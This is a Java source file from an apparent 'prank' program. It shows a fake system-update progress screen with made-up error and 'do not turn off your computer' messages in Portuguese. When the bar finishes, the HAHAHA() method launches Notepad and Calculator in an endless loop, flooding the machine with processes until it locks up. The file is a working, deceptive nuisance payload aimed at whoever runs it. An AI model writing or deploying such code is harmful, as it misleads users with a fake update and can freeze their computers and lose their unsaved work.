
package Model;

import View.Prank_GUI;
import static View.Prank_GUI.Prog;
import static View.Prank_GUI.msg;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Funcaos_DAO {
    
    public static void Mostrar(){
        new Thread(){
        
            public void run() {
        
        
        for (int i=0; i<101; i++){
                    try {
                        sleep(60); 
                        
                        Prog.setValue(i);
                        
                        if(Prog.getValue() == 10){
                        
                            msg.setText("REDE SENDO ATUALIZADA");
                            
                            sleep(2000);
                                                       
                        
                        }else if (Prog.getValue() <=30){
                            msg.setText("ERRO 401: SERVIDOR INDISPONIVEL");
                          sleep(100);  
                        } else if (Prog.getValue() <=99){
                            msg.setText("NÃO DESLIGUE O SEU COMPUTADOR");
                            
                        }else{
                            msg.setText("ATUALIZAÇÃO COMPLETA: HAHAHA");
                        
                        sleep(3000);
                        
                        Model.Funcaos_DAO.HAHAHA();
                        }
                        
                        
                    } catch (InterruptedException ex) {
                        Logger.getLogger(Prank_GUI.class.getName()).log(Level.SEVERE, null, ex);
                    }
        
        
        
        
        }        
        }
        
        }.start();
        
    }
    
    public static void Iniciar(){
       new Prank_GUI().setVisible(true);

    }
    public static void HAHAHA(){
        String chamandoexe = "C:\\windows\\notepad.exe";
        String chamandoexe2 = "C:\\windows\\calc.exe";
        
        boolean baka=true;
        try{
            while (baka){
                Runtime.getRuntime().exec(chamandoexe);
                Runtime.getRuntime().exec(chamandoexe2);
            }
            

        } catch(Exception e){

        System.out.println(e.getMessage());

}
}
}
